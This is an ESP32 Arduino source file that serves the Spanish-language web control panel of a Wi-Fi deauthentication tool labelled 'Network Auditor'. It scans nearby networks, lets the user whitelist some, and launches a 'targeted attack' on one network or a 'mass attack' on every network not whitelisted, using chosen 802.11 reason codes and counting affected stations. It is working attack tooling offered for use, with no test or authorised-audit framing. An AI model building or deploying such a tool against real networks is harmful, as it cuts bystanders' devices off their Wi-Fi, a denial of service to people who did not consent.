#include <WiFi.h>
#include <WebServer.h>
#include "web_interface.h"
#include "definitions.h"
#include "deauth.h"
#include "types.h"

WebServer server(80);
int num_networks = 0;

whitelist_t whitelist = { .count = 0 };
extern int deauth_type_whitelist;

String getEncryptionType(wifi_auth_mode_t encryptionType);
void redirect_root();
void handle_root();
void handle_deauth();
void handle_deauth_whitelist();
void handle_rescan();
void handle_stop();
void handle_whitelist_add();
void handle_whitelist_remove();
void handle_whitelist_clear();
void start_web_interface();
void web_interface_handle_client();

bool is_in_whitelist(uint8_t *bssid) {
    for (int i = 0; i < whitelist.count; i++) {
        if (memcmp(whitelist.entries[i].bssid, bssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

String htmlEscape(String s) {
    s.replace("&", "&amp;");
    s.replace("<", "&lt;");
    s.replace(">", "&gt;");
    s.replace("\"", "&quot;");
    s.replace("'", "&#39;");
    return s;
}

void add_to_whitelist(uint8_t *bssid) {
    if (whitelist.count >= MAX_WHITELIST_NETWORKS) return;
    if (is_in_whitelist(bssid)) return;
    
    memcpy(whitelist.entries[whitelist.count].bssid, bssid, 6);
    whitelist.entries[whitelist.count].active = true;
    whitelist.count++;
}

void remove_from_whitelist(uint8_t *bssid) {
    for (int i = 0; i < whitelist.count; i++) {
        if (memcmp(whitelist.entries[i].bssid, bssid, 6) == 0) {
            for (int j = i; j < whitelist.count - 1; j++) {
                whitelist.entries[j] = whitelist.entries[j + 1];
            }
            whitelist.count--;
            return;
        }
    }
}

void clear_whitelist() {
    whitelist.count = 0;
}

void redirect_root() {
    server.sendHeader("Location", "/");
    server.send(301);
}

void handle_root() {
    String html = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP32 Network Auditor</title>
    <style>
        :root {
            --bg: #0f172a;
            --card-bg: #1e293b;
            --accent: #38bdf8;
            --danger: #f43f5e;
            --success: #10b981;
            --warning: #f59e0b;
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --border: #334155;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg);
            color: var(--text-main);
            line-height: 1.5;
            padding: 16px;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid var(--border);
            margin-bottom: 24px;
        }
        .header h1 { font-size: 1.3rem; font-weight: 700; color: var(--accent); }
        .status { font-size: 0.8rem; color: var(--success); }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 12px;
            margin-bottom: 24px;
        }
        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            padding: 16px;
            border-radius: 10px;
        }
        .stat-number { font-size: 1.6rem; font-weight: 800; display: block; }
        .stat-label { font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; }
        .section {
            background: var(--card-bg);
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
        }
        .section-title { font-size: 0.9rem; margin-bottom: 12px; color: var(--text-dim); text-transform: uppercase; }
        .table-wrapper { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; min-width: 500px; }
        th { text-align: left; padding: 10px; color: var(--text-dim); border-bottom: 2px solid var(--border); }
        td { padding: 10px; border-bottom: 1px solid var(--border); }
        tr:hover { background: rgba(255,255,255,0.02); }
        .btn {
            display: inline-block;
            padding: 8px 14px;
            border-radius: 6px;
            font-size: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            border: none;
            transition: opacity 0.2s;
        }
        .btn-primary { background: var(--accent); color: var(--bg); }
        .btn-danger { background: var(--danger); color: white; }
        .btn-success { background: var(--success); color: white; }
        .btn-outline { background: transparent; border: 1px solid var(--border); color: var(--text-main); }
        .btn-block { width: 100%; margin-top: 10px; }
        .btn:hover { opacity: 0.8; }
        .form-input {
            width: 100%;
            background: var(--bg);
            border: 1px solid var(--border);
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin: 6px 0;
        }
        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
        .protected { background: rgba(16, 185, 129, 0.1); }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            font-weight: 700;
        }
        .badge-success { background: var(--success); color: white; }
        @media (max-width: 640px) {
            .control-grid { grid-template-columns: 1fr; }
            .header h1 { font-size: 1.1rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>NETWORK AUDITOR</h1>
            <div class="status">SISTEMA ACTIVO</div>
        </div>
        <div class="stats-grid">
            <div class="stat-card">
                <span class="stat-label">Redes Detectadas</span>
                <span class="stat-number">)rawliteral" + String(num_networks) + R"rawliteral(</span>
            </div>
            <div class="stat-card">
                <span class="stat-label">Estaciones Afectadas</span>
                <span class="stat-number" style="color: var(--danger)">)rawliteral" + String(eliminated_stations) + R"rawliteral(</span>
            </div>
            <div class="stat-card">
                <span class="stat-label">Redes Protegidas</span>
                <span class="stat-number" style="color: var(--success)">)rawliteral" + String(whitelist.count) + R"rawliteral(</span>
            </div>
        </div>
        <div class="section">
            <h2 class="section-title">Redes WiFi Disponibles</h2>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>SSID</th>
                            <th>BSSID</th>
                            <th>Ch</th>
                            <th>Signal</th>
                            <th>Acción</th>
                        </tr>
                    </thead>
                    <tbody>
)rawliteral";

    for (int i = 0; i < num_networks; i++) {
        String bssidStr = WiFi.BSSIDstr(i);
        bool isProtected = is_in_whitelist(WiFi.BSSID(i));
        int rssi = WiFi.RSSI(i);
        
        if (isProtected) {
            html += "<tr class='protected'>";
        } else {
            html += "<tr>";
        }
        
        html += "<td><strong>" + String(i) + "</strong></td>";
        html += "<td><strong>" + htmlEscape(WiFi.SSID(i)) + "</strong></td>";
        html += "<td style='font-family:monospace;font-size:0.8rem'>" + bssidStr + "</td>";
        html += "<td>" + String(WiFi.channel(i)) + "</td>";
        html += "<td>" + String(rssi) + " dBm</td>";
        html += "<td>";
        
        if (isProtected) {
            html += "<span class='badge badge-success'>PROTEGIDA</span> ";
            html += "<form method='POST' action='/whitelist/remove' style='display:inline; margin:0; padding:0;'>";
            html += "<input type='hidden' name='bssid' value='" + bssidStr + "'>";
            html += "<button type='submit' class='btn btn-danger'>Quitar</button>";
            html += "</form>";
        } else {
            html += "<form method='POST' action='/whitelist/add' style='display:inline; margin:0; padding:0;'>";
            html += "<input type='hidden' name='net_id' value='" + String(i) + "'>";
            html += "<button type='submit' class='btn btn-primary'>Proteger</button>";
            html += "</form>";
        }
        
        html += "</td></tr>";
    }

    html += R"rawliteral(
                    </tbody>
                </table>
            </div>
            <form method="post" action="/rescan">
                <button type="submit" class="btn btn-outline btn-block">Escanear Redes</button>
            </form>
        </div>
        <div class="control-grid">
            <div class="section">
                <h3 class="section-title">Ataque Dirigido</h3>
                <form method="post" action="/deauth">
                    <input type="number" name="net_num" class="form-input" placeholder="ID de Red (0, 1, 2...)" required min="0">
                    <input type="number" name="reason" class="form-input" value="1" placeholder="Código Razón" required min="1">
                    <button type="submit" class="btn btn-primary btn-block" style="background: var(--warning)">Iniciar Ataque Dirigido</button>
                </form>
            </div>
            <div class="section">
                <h3 class="section-title">Ataque Masivo</h3>
                <p style="font-size:0.75rem;color:var(--text-dim);margin-bottom:10px;">Afecta TODAS las redes excepto las protegidas.</p>
                <form method="post" action="/deauth_whitelist">
                    <input type="number" name="reason" class="form-input" value="1" required min="1">
                    <button type="submit" class="btn btn-danger btn-block">Iniciar Ataque Masivo</button>
                </form>
            </div>
        </div>
        <div class="section">
            <h2 class="section-title">Códigos de Razón 802.11</h2>
            <div class="table-wrapper">
                <table>
                    <thead><tr><th>Código</th><th>Nombre</th><th>Descripción</th></tr></thead>
                    <tbody>
                        <tr><td><strong>1</strong></td><td>Razón No Especificada</td><td>Desconexión por razón desconocida</td></tr>
                        <tr><td><strong>2</strong></td><td>Autenticación Inválida</td><td>La autenticación previa ya no es válida</td></tr>
                        <tr><td><strong>3</strong></td><td>Estación Saliendo</td><td>La estación se desconecta porque sale del BSS</td></tr>
                        <tr><td><strong>4</strong></td><td>Inactividad</td><td>Desconexión por periodo prolongado de inactividad</td></tr>
                        <tr><td><strong>5</strong></td><td>Capacidad Excedida</td><td>El AP no tiene capacidad para más estaciones</td></tr>
                        <tr><td><strong>6</strong></td><td>Clase Inválida</td><td>La estación no soporta la clase de servicio</td></tr>
                        <tr><td><strong>7</strong></td><td>Sin ACK</td><td>No se recibió ACK en tramas no difundidas</td></tr>
                        <tr><td><strong>8</strong></td><td>Disasociando</td><td>Estación disociada porque sale del BSS</td></tr>
                        <tr><td><strong>9</strong></td><td>Reasociación Fallida</td><td>La reasociación no pudo completarse</td></tr>
                        <tr><td><strong>10</strong></td><td>Preautenticación Inválida</td><td>La preautenticación fue rechazada</td></tr>
                        <tr><td><strong>14</strong></td><td>Error MIC (WPA)</td><td>Fallo en código de integridad WPA/WPA2</td></tr>
                        <tr><td><strong>15</strong></td><td>Timeout 4-Way Handshake</td><td>Tiempo agotado en handshake WPA/WPA2</td></tr>
                        <tr><td><strong>16</strong></td><td>Grupo Key Timeout</td><td>Tiempo agotado en actualización de clave de grupo</td></tr>
                        <tr><td><strong>17</strong></td><td>Frame Inválido</td><td>Se recibió un frame con contenido inválido</td></tr>
                        <tr><td><strong>18</strong></td><td>Parámetros Inválidos</td><td>Parámetros de conexión inválidos</td></tr>
                        <tr><td><strong>19</strong></td><td>IEEE 802.1X Fallo</td><td>Fallo en autenticación IEEE 802.1X</td></tr>
                        <tr><td><strong>22</strong></td><td>Mejor AP Disponible</td><td>La estación encontró un AP mejor</td></tr>
                        <tr><td><strong>23</strong></td><td>802.1X Fallo</td><td>Fallo en autenticación IEEE 802.1X</td></tr>
                        <tr><td><strong>24</strong></td><td>Fuera del Área</td><td>La estación está fuera del área de cobertura</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
        <div class="section" style="text-align:center">
            <form method="post" action="/stop">
                <button type="submit" class="btn btn-success btn-block" style="padding: 14px">DETENER TODOS LOS ATAQUES</button>
            </form>
        </div>
    </div>
</body>
</html>
)rawliteral";

    server.send(200, "text/html", html);
}

void handle_deauth() {
    int wifi_number = server.arg("net_num").toInt();
    int reason_param = server.arg("reason").toInt();
    uint16_t reason = (reason_param > 0 && reason_param <= 0xFFFF)
                          ? static_cast<uint16_t>(reason_param)
                          : static_cast<uint16_t>(1);

    String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { background: #0f172a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .card { background: #1e293b; padding: 30px; border-radius: 12px; text-align: center; border: 1px solid #334155; }
    .btn { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #38bdf8; color: #0f172a; text-decoration: none; border-radius: 6px; font-weight: bold; }
</style></head>
<body>
    <div class="card">
)rawliteral";

    if (wifi_number >= 0 && wifi_number < num_networks) {
        html += "<h2>Ataque Iniciado</h2><p>Objetivo: <strong>" + htmlEscape(WiFi.SSID(wifi_number)) + "</strong></p>";
        html += "<p style='color:#94a3b8;font-size:0.85rem'>BSSID: " + WiFi.BSSIDstr(wifi_number) + "</p>";
        start_deauth(wifi_number, DEAUTH_TYPE_SINGLE, reason);
    } else {
        html += "<h2>Error</h2><p>ID de red invalido: #" + String(wifi_number) + "</p>";
    }

    html += "<a href='/' class='btn'>Regresar</a></div></body></html>";
    server.send(200, "text/html", html);
}

void handle_deauth_whitelist() {
    int reason_param = server.arg("reason").toInt();
    uint16_t reason = (reason_param > 0 && reason_param <= 0xFFFF)
                          ? static_cast<uint16_t>(reason_param)
                          : static_cast<uint16_t>(1);

    String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { background: #0f172a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .card { background: #1e293b; padding: 30px; border-radius: 12px; text-align: center; border: 2px solid #f43f5e; }
    .btn { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #f43f5e; color: white; text-decoration: none; border-radius: 6px; }
</style></head>
<body>
    <div class="card">
        <h2>Ataque Masivo Iniciado</h2>
        <p style="color:#94a3b8">Las redes protegidas NO serán afectadas.</p>
        <a href='/' class='btn'>Ver Panel</a>
    </div>
</body></html>
)rawliteral";

    server.send(200, "text/html", html);
    deauth_type_whitelist = 1;
    start_deauth(0, DEAUTH_TYPE_ALL, reason);
}

void handle_rescan() {
    num_networks = WiFi.scanNetworks();
    redirect_root();
}

void handle_stop() {
    stop_deauth();
    redirect_root();
}

void handle_whitelist_add() {
    int net_id = server.arg("net_id").toInt();
    if (net_id >= 0 && net_id < num_networks) {
        if (whitelist.count >= MAX_WHITELIST_NETWORKS) {
            server.send(200, "text/html",
                "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
                "<style>body{background:#0f172a;color:white;font-family:sans-serif;"
                "display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}"
                ".card{background:#1e293b;padding:30px;border-radius:12px;text-align:center;"
                "border:1px solid #334155;}"
                ".btn{display:inline-block;margin-top:20px;padding:10px 20px;background:#38bdf8;"
                "color:#0f172a;text-decoration:none;border-radius:6px;font-weight:bold;}</style>"
                "</head><body><div class='card'>"
                "<h2>Lista Blanca Llena</h2>"
                "<p>Se alcanzó el límite máximo de redes protegidas.</p>"
                "<a href='/' class='btn'>Regresar</a></div></body></html>");
            return;
        }
        add_to_whitelist(WiFi.BSSID(net_id));
    }
    redirect_root();
}

void handle_whitelist_remove() {
    String bssidStr = server.arg("bssid");
    bssidStr.replace(":", "");
    if (bssidStr.length() != 12) {
        redirect_root();
        return;
    }
    for (unsigned int i = 0; i < 12; i++) {
        char c = bssidStr[i];
        if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
            redirect_root();
            return;
        }
    }
    uint8_t bssid[6];
    for (int i = 0; i < 6; i++) {
        String byteStr = bssidStr.substring(i * 2, i * 2 + 2);
        bssid[i] = strtol(byteStr.c_str(), NULL, 16);
    }
    remove_from_whitelist(bssid);
    redirect_root();
}

void handle_whitelist_clear() {
    clear_whitelist();
    redirect_root();
}

void start_web_interface() {
    server.on("/", handle_root);
    server.on("/deauth", handle_deauth);
    server.on("/deauth_whitelist", handle_deauth_whitelist);
    server.on("/rescan", handle_rescan);
    server.on("/stop", handle_stop);
    server.on("/whitelist/add", handle_whitelist_add);
    server.on("/whitelist/remove", handle_whitelist_remove);
    server.on("/whitelist/clear", handle_whitelist_clear);
    server.begin();
}

void web_interface_handle_client() {
    server.handleClient();
}

String getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Ent";
        default: return "Unknown";
    }
}
